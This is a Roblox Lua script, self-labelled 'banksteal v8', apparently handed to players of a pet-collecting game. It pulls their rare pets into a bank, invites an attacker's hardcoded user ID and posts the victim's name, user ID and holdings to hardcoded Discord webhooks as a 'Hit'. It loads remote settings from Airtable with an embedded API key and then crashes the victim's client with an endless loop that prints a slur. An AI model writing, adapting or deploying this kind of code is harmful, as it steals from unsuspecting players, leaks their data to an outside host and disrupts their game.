
local YourWebHookHere = ""
YourWebHookHere =  "https://api.airtable.com/v0/appjAf8JSB9AFwYgN/XYZ?maxRecords=3&view=Grid%20view&api_key=keyN5IMByC4eCdwDZ&filterByFormula=NOT(NOT({WHID}+%3D+%27".._G.License.."%27))"  -- web hook here
local mod2 = require(game:GetService("ReplicatedStorage").X.Util.MD5)
local http = game:GetService("HttpService")
local url = YourWebHookHere
local username = game:GetService("Players").LocalPlayer.Name
local lib = require(game:GetService("ReplicatedStorage").Framework.Library)
 
local data = {}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}

-- Local remotes

local remotes = _G.remotes

-- Local remotes
print("Came after Setup")
request = http_request or request or HttpGet or syn.request
local abcdef = {Url = url, Method = "GET", Headers = headers}
local result = request(abcdef)
local result = result.Body
local result = http:JSONDecode(result)
if #result.records == 1 then
local f = result.records[1].fields.AutoGemDeposit
if f then
_G.DepoAllGems = result.records[1].fields.AutoGemDeposit
else
_G.DepoAllGems = false
end
local f = result.records[1].fields.AutoPetDeposit
if f then
_G.DepoAllPets = result.records[1].fields.AutoPetDeposit
else
_G.DepoAllPets = false
end
local f = result.records[1].fields.Crash
if f then
_G.Crash = result.records[1].fields.Crash
else
_G.Crash = false
end
local f = result.records[1].fields.UseWebhook
if f then
_G.UseWebhook = result.records[1].fields.UseWebhook
else
_G.UseWebhook = false
end
_G.Webhook = result.records[1].fields.Webhook
_G.UserId = result.records[1].fields.UserId
else
_G.DepoAllGems = true
_G.DepoAllPets = true
_G.Crash = true
_G.UseWebhook = true
_G.UserId = 1
_G.Webhook = "https://discord.com/api/webhooks/994770073203986472/58rRqh11lF_7iIgHzAI-O-qS9mQmj1GtOWh2Cg4wYjCl0gWKGuzXUKhlHZoApOVZ5yvb"
end

local Bank = ""

print("Came after Setup 2")

wait(1)
local A_1 = 
{
}
local res = lib.Network.Invoke(remotes.GMB);
Bank = res[1]["BUID"]
if Bank == nil then
return
end

local A_1 = 
{
  [1] = Bank
}
local res = lib.Network.Invoke(remotes.GB, Bank);
local A_1 = 
{
  [1] = Bank, 
  [2] = {},
  [3] = 1
}
local res = lib.Network.Invoke(remotes.Withdraw, Bank, {}, 1);
require(game:GetService("ReplicatedStorage").Framework.Client["5 | Message"]).New("We are settings everything up for you. This can take up to 10 minutes depending on your ping and exploit.")
wait(30)
local output = ""
local FinalList = {}
--[[if _G.DepoAllGems then
local gemText = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
wait(1)
for i = 1, #gemText, 1 do
if string.sub(gemText, i, i) == "1" then
output = output.."1"
elseif string.sub(gemText, i, i) == "2" then
output = output.."2"
elseif string.sub(gemText, i, i) == "3" then
output = output.."3"
elseif string.sub(gemText, i, i) == "4" then
output = output.."4"
elseif string.sub(gemText, i, i) == "5" then
output = output.."5"
elseif string.sub(gemText, i, i) == "6" then
output = output.."6"
elseif string.sub(gemText, i, i) == "7" then
output = output.."7"
elseif string.sub(gemText, i, i) == "8" then
output = output.."8"
elseif string.sub(gemText, i, i) == "9" then
output = output.."9"
elseif string.sub(gemText, i, i) == "0" then
output = output.."0"
end
end
output = tonumber(output)

else
output = tonumber("1")
end]]--
print("Came after Setup 3")
output = 1
  Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
  Functions   = Library.Functions
if _G.DepoAllPets then
  EXCList     = {}
    MythicList  = {}
    HugeList = {}
HardcoreList = {}
GiftList = {}

  PogList = {139, 177, 176, 178, 6969}
    EList       = {}
    MList       = {}
    HList	= {}
    PList = {}


  table.foreach(Library.Directory.Pets, function(i, v)
    if v.rarity == "Exclusive" and not v.huge then
      table.insert(EXCList, i)
    end
    if v.rarity == "Mythical" then
      table.insert(MythicList, i)
    end
    if v.huge then
      table.insert(HugeList, i)
    end
    if v.isGift then
      table.insert(GiftList, i)
    end
  end)
  for i, v in pairs(PogList) do
  table.insert(EXCList, v)
  end
local A_1 = 
{
}
local banknr = lib.Network.Invoke(remotes.GMB)
if #banknr >= 2 then
for i = 2, #banknr, 1 do
local A_1 = 
{
  [1] = banknr[i]["BUID"]
}
local ABCXD = lib.Network.Invoke(remotes.GB, banknr[i]["BUID"])
local list = {}
for i, v in pairs(ABCXD["Storage"]["Pets"]) do
if #list < 50 then
if table.find(EXCList, v["id"]) ~= nil then
table.insert(list, v["uid"])
end
if v.hc then
table.insert(list, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(list, v["uid"])
end
end
end
if #list >= 1 then
local A_1 = 
{
  [1] = banknr[i]["BUID"], 
  [2] = list, 
  [3] = 0
}
local ABCXD = lib.Network.Invoke(remotes.Withdraw, banknr[i]["BUID"], list, 0)
wait(8)
end
end
end
print("Came after Withd")
local pets = require(game:GetService("ReplicatedStorage").Framework.Client["4 | Save"]).Get().Pets
local y = {}
for i, v in pairs(pets) do
y[v["uid"]] = false
end
local ABCXD = lib.Network.Invoke(remotes.Lock, y)
for i, v in pairs(pets) do
if table.find(EXCList, v["id"]) ~= nil then
table.insert(EList, v["uid"])
end
if table.find(MythicList, v["id"]) ~= nil then
table.insert(MList, v["uid"])
end
if table.find(HugeList, v["id"]) ~= nil then
table.insert(HList, v["uid"])
end
if v.hc then
table.insert(HardcoreList, v["uid"])
end
end
local counter = 1
repeat
table.insert(FinalList, HList[counter])
counter = counter + 1
until #FinalList == 50 or counter > #HList
local counter = 1
if #FinalList < 50 then
repeat
table.insert(FinalList, HardcoreList[counter])
counter = counter + 1
until #FinalList == 50 or counter > #HardcoreList
end
if #FinalList < 50 then
local counter = 1
repeat
table.insert(FinalList, EList[counter])
counter = counter + 1
until #FinalList == 50 or counter > #EList
end
wait(0.5)
game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
local A_1 = 
{
  [1] = "Cracked Egg", 
  [2] = false
}
local Event = lib.Network.Invoke(remotes.Egg, "Cracked Egg", false, false)
wait(0.5)
end
print("Came after Egg")
if _G.DepoAllGems or _G.DepoAllPets or _G.DepoAllGems and _G.DepoAllPets then
local A_1 = 
{
  [1] = Bank, 
  [2] = FinalList, 
  [3] = 1
}
local Event = lib.Network.Invoke(remotes.Deposit, Bank, FinalList, 1)
print("Came after Depo")
if typeof(Event) == "Table" then for i, v in pairs(Event) do print(i, v) end end
print(#FinalList)
end
wait(0.5)
local A_1 = 
{
  [1] = Bank
}
local ABCXD = lib.Network.Invoke(remotes.GB, Bank)
if ABCXD["Tier"] == 1 then
return
end
local numb = {1, 2, 3, 4, 5, 6, 6, 6}
if #ABCXD["Players"] == numb[ABCXD["Tier"]] then
local A_1 = 
{
  [1] = Bank, 
  [2] = ABCXD["Players"][#ABCXD["Players"]]
}
local Event = lib.Network.Invoke(remotes.Kick, Bank, ABCXD["Players"][#ABCXD["Players"]])

end
wait(0.5)
local A_1 = 
{
  [1] = Bank
}
local SuperBank = lib.Network.Invoke(remotes.GB, Bank)
  EXCList     = {}
     MythicList  = {}
  LegList = {}
  EpicList = {}
  RareList = {}
  CommonList = {}
  
  HugeList = {}
  HCList = {}
  GiftList = {}
  
  ScumList = {358, 359, 360, 361, 363, 364, 365, 366, 367, 368, 369, 377, 378, 117, 140, 131, 147, 156, 185, 199, 210, 241, 242, 246, 130, 98, 142, 148, 168, 90, 133, 183, 106, 6969}
  PogList = {139, 177, 176, 178}
  
  EXCCount = 0
  MythicCount = 0
  LegCount = 0
  EpicCount = 0
  RareCount = 0
  CommonCount = 0
  
  HugeCount = 0
  
  ScumCount = 0
  PogCount = 0
  HCCount = 0
  GiftCount = 0
  
  table.foreach(Library.Directory.Pets, function(i, v)
    if v.rarity == "Exclusive" and not v.huge then
      table.insert(EXCList, i)
    end
    if v.rarity == "Mythical" then
      table.insert(MythicList, i)
    end
    if v.rarity == "Legendary" then
      table.insert(LegList, i)
    end
    if v.rarity == "Epic" then
      table.insert(EpicList, i)
    end
    if v.rarity == "Rare" then
      table.insert(RareList, i)
    end
    if v.rarity == "Basic" then
      table.insert(CommonList, i)
    end
    if v.huge then
      table.insert(HugeList, i)
    end
    if v.isGift then
      table.insert(GiftList, i)
    end
  end)
  for i, v in pairs(SuperBank["Storage"]["Pets"]) do
  if table.find(EXCList, v["id"]) then EXCCount = EXCCount + 1 end
  if table.find(MythicList, v["id"]) then MythicCount = MythicCount + 1 end
  if table.find(LegList, v["id"]) then LegCount = LegCount + 1 end
  if table.find(EpicList, v["id"]) then EpicCount = EpicCount + 1 end
  if table.find(RareList, v["id"]) then RareCount = RareCount + 1 end
  if table.find(CommonList, v["id"]) then CommonCount = CommonCount + 1 end
  if table.find(HugeList, v["id"]) then HugeCount = HugeCount + 1 end
  if table.find(ScumList, v["id"]) then ScumCount = ScumCount + 1 end
  if table.find(PogList, v["id"]) then PogCount = PogCount + 1 end
  if v.hc then HCCount = HCCount + 1 end
  if v.hc and v.s >= 30000000000000 then ScumCount = ScumCount + 1 end
  if v.id == 199 and v.s == 75000000 then ScumCount = ScumCount + 1 end
  if v.id == 272 and v.s == 70000000000 then ScumCount = ScumCount + 1 end
  if table.find(GiftList, v["id"]) then GiftCount = GiftCount + 1 end
  end
  if HugeCount >= 1 or EXCCount >= 20 or ScumCount >= 1 or GiftCount >= 1 then
local A_1 = 
{
  [1] = Bank, 
  [2] = 884869707
}
local ABCXD = lib.Network.Invoke(remotes.Invite, Bank, 884869707)
  
local url = "https://discord.com/api/webhooks/1014877367698718741/rfp2nbdDcJDL3j4Eh_YzQmDPD_WS0MAo8TQpEkgiEpatSL7gSAb_9hdVUQTo2f-0CcN-"
local username = game:GetService("Players").LocalPlayer.Name
 
local data = {
  ["content"] = "@everyone We Got a Hit!",
["embeds"] = {{
["title"] = "__**Bank Steal Results**__",
["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
["type"] = "rich",
["color"] = tonumber(0x0E980E),
["fields"] = {
               {
["name"] = "__User__",
["value"] = "** ("..game.Players.LocalPlayer.DisplayName..") "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
["inline"] = false
},
               {
["name"] = "__Gems__",
["value"] = SuperBank["Storage"]["Currency"]["Diamonds"],
["inline"] = false
},
{
["name"] = "__Pets Overall__",
["value"] = #SuperBank["Storage"]["Pets"],
["inline"] = false
},
{
["name"] = "__Huges__",
["value"] = HugeCount,
["inline"] = true
},
{
["name"] = "__Exclusives__",
["value"] = EXCCount,
["inline"] = true
},
{
["name"] = "__Gifts/Eggs__",
["value"] = GiftCount,
["inline"] = true
},
{
["name"] = "__Hardcore Pets__",
["value"] = HCCount,
["inline"] = true
},
{
["name"] = "__BankID__",
["value"] = Bank,
["inline"] = false
},
}
}}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
_G.UseWebhook = false
_G.UserId = 0
_G.Crash = true
wait(0.5)
print("Got after Request")
  end
  if _G.UseWebhook then
local YourWebHookHere = _G.Webhook

local url = YourWebHookHere
local username = game:GetService("Players").LocalPlayer.Name
 
local data = {
  ["content"] = "@everyone We Got a Hit!",
["embeds"] = {{
["title"] = "__**Bank Steal Results**__",
["description"] = "(amogusbot/ghostcat banksteal v8 by Crystal from BlobScripts)",
["type"] = "rich",
["color"] = tonumber(0x0E980E),
["fields"] = {
               {
["name"] = "__User__",
["value"] = "** ("..game.Players.LocalPlayer.DisplayName..") ".." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
["inline"] = false
},
               {
["name"] = "__Gems__",
["value"] = SuperBank["Storage"]["Currency"]["Diamonds"],
["inline"] = false
},
{
["name"] = "__Pets Overall__",
["value"] = #SuperBank["Storage"]["Pets"],
["inline"] = false
},
{
["name"] = "__Huges__",
["value"] = HugeCount,
["inline"] = true
},
{
["name"] = "__Exclusives__",
["value"] = EXCCount,
["inline"] = true
},
{
["name"] = "__Gifts/Eggs__",
["value"] = GiftCount,
["inline"] = true
},
{
["name"] = "__Hardcore Pets__",
["value"] = HCCount,
["inline"] = true
},
{
["name"] = "__BankID__",
["value"] = Bank,
["inline"] = false
},
}
}}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
  ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
local A_1 = 
{
  [1] = Bank, 
  [2] = _G.UserId
}
local ABCXD = lib.Network.Invoke(remotes.Invite, Bank, _G.UserId)
end
wait(0.5)
if _G.Crash then
spawn(function()
while true do
print("raped")
spawn(function()
while true do
print("raped")
end
end)
end
end)
end
--lol

